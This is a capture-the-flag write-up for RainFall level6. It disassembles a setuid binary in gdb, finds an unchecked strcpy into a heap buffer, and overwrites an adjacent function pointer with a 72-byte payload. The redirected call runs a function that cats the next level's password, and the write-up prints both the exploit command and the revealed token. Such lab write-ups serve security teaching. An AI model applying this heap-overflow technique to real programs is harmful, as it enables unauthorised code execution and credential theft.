# Preparations

Entering level6 home directory we see a level6 binary with sticky bit in access rights.
By objdumping the binary we see 3 functions: main, m and n:

	level6@RainFall:~$ objdump -D -M intel-mnemonic level6 > /tmp/dump

Why do we do objdump first? Maybe in this exercise a function exists but is not used so we need to see all the functions.

# Code writing

We start to work with gdb in Intel syntax (set disassembly-flavor intel):

	(gdb) disass main
    Dump of assembler code for function main:
       0x0804847c <+0>:	push   ebp
       0x0804847d <+1>:	mov    ebp,esp
       0x0804847f <+3>:	and    esp,0xfffffff0
       0x08048482 <+6>:	sub    esp,0x20
       0x08048485 <+9>:	mov    DWORD PTR [esp],0x40 			;argument for malloc
       0x0804848c <+16>:	call   0x8048350 <malloc@plt> 		;call malloc with arguments
       0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax 	;result of malloc to some value
       0x08048495 <+25>:	mov    DWORD PTR [esp],0x4  		;argument for malloc
       0x0804849c <+32>:	call   0x8048350 <malloc@plt>   	;call malloc with arguments
       0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax 	;result of malloc to some value
       0x080484a5 <+41>:	mov    edx,0x8048468 			;upload the beginning of the m function 
       0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18] 	;something with variables, put address of m function to the variable
       0x080484ae <+50>:	mov    DWORD PTR [eax],edx 		;something with variables, put address of m function to the variable
       0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc] 		;something with variables, argv is used
       0x080484b3 <+55>:	add    eax,0x4 				;something with variables, argv[1] is taken
       0x080484b6 <+58>:	mov    eax,DWORD PTR [eax] 		;arguments for strcpy
       0x080484b8 <+60>:	mov    edx,eax 				;arguments for strcpy
       0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c] 	;arguments for strcpy
       0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx 		;arguments for strcpy
       0x080484c2 <+70>:	mov    DWORD PTR [esp],eax 		;arguments for strcpy
       0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>   	;call strcpy with arguments
       0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18] 	;something with variables, deal with variable that we used before
       0x080484ce <+82>:	mov    eax,DWORD PTR [eax] 		;prepare to call functions that is a variable
       0x080484d0 <+84>:	call   eax 				;call function that lies in a variable
       0x080484d2 <+86>:	leave
       0x080484d3 <+87>:	ret

Something new!\
Let's look at the m function:

	(gdb) disass m
    Dump of assembler code for function m:
       0x08048468 <+0>:	push   ebp
       0x08048469 <+1>:	mov    ebp,esp
       0x0804846b <+3>:	sub    esp,0x18
       0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1 		;argument for puts
       0x08048475 <+13>:	call   0x8048360 <puts@plt> 		;call puts with arguments
       0x0804847a <+18>:	leave
       0x0804847b <+19>:	ret

Let's look at the n function:

	(gdb) disass n
    Dump of assembler code for function n:
       0x08048454 <+0>:	push   ebp
       0x08048455 <+1>:	mov    ebp,esp
       0x08048457 <+3>:	sub    esp,0x18
       0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0 		;argument for system
       0x08048461 <+13>:	call   0x8048370 <system@plt>   	;call system with arguments
       0x08048466 <+18>:	leave
       0x08048467 <+19>:	ret

Let's see some insites by their addresses:

	Breakpoint 10, 0x080484d0 in main ()
    (gdb) p/x $eax
        $5 = 0x8048468
    (gdb) x/s 0x80485b0
        $6 = "/bin/cat /home/user/level7/.pass"
    (gdb) x/s 0x80485d1
        $7 = "Nope"

Here we call an `m` function in the end of `main`.\
All the strings, arguments and FILE streams are known now.

# Exploitation

If we just start the binary, we have:

    level6@RainFall:~$ ./level6 abc
        Nope

Instead of "Nope" we need to print a token. This we can do if we send `n` function instead of the `m` function.\
Let's see what we have:

    Breakpoint 11, 0x080484ca in main ()
    (gdb) x/20wx $esp+0x18
        0xbffff6e8:	**0x0804a050**	0x0804a008	0x080484e0	0x00000000
        0xbffff6f8:	0x00000000	0xb7e454d3	0x00000002	0xbffff794
        0xbffff708:	0xbffff7a0	0xb7fdc858	0x00000000	0xbffff71c
        0xbffff718:	0xbffff7a0	0x00000000	0x0804822c	0xb7fd0ff4
        0xbffff728:	0x00000000	0x00000000	0x00000000	0x6d746187
    (gdb) x/wx $esp+0x18
        0xbffff6e8:	0x0804a050
    (gdb) p/x *0x0804a050
        $9 = 0x8048468

One more time - that is the address of the `m` function.

    Breakpoint 10, 0x080484d0 in main ()
    (gdb) p/x $eax
        $5 = 0x8048468

Let's find argument sent to the `m` function (playing with arguments sent to the binary):

    (gdb) x/wx $esp+0x1c
        0xbffff6ec:	0x0804a008
    (gdb) p/s *0x0804a008
        $12 = 1094795585
    (gdb) p/x *0x0804a008
        $13 = 0x41414141
    (gdb) p/x *0x0804a008
        $14 = 0x41414141

Here are my 11 Аs
    
    (gdb) p/c *(0x0804a008 + 1)
    $32 = 65 'A'
    (gdb) p/c *(0x0804a008 + 2)
    $33 = 65 'A'
    (gdb) p/c *(0x0804a008 + 3)
    $34 = 65 'A'
    (gdb) p/c *(0x0804a008 + 4)
    $35 = 65 'A'
    (gdb) p/c *(0x0804a008 + 5)
    $36 = 65 'A'
    (gdb) p/c *(0x0804a008 + 6)
    $37 = 65 'A'
    (gdb) p/c *(0x0804a008 + 7)
    $38 = 65 'A'
    (gdb) p/c *(0x0804a008 + 8)
    $39 = 65 'A'
    (gdb) p/c *(0x0804a008 + 9)
    $40 = 65 'A'
    (gdb) p/c *(0x0804a008 + 10)
    $41 = 65 'A'
    (gdb) p/c *(0x0804a008 + 11)
    $42 = 0 '\000'

And that is where call to `m` function lies:

    (gdb) x/10wx 0x0804a008
        0x804a008:	0x41414141	0x41414141	0x00414141	0x00000000
        0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804a028:	0x00000000	0x00000000
    (gdb) x/20wx 0x0804a008
        0x804a008:	0x41414141	0x41414141	0x00414141	0x00000000
        0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804a048:	0x00000000	0x00000011	**0x08048468**	0x00000000

That is 72 bytes starting from the buffer beginning:

    (gdb) p/x 0x804a048 + 8
        $44 = 0x804a050
    (gdb) p 0x804a050 - 0x804a008
        $45 = 72

Now let's replace `m` address with `n` address that is 0x08048454 or \x54\x84\x04\x08 in little-endian by writing it over.\
We make:

    level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
        f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

# Result

    level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
        f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
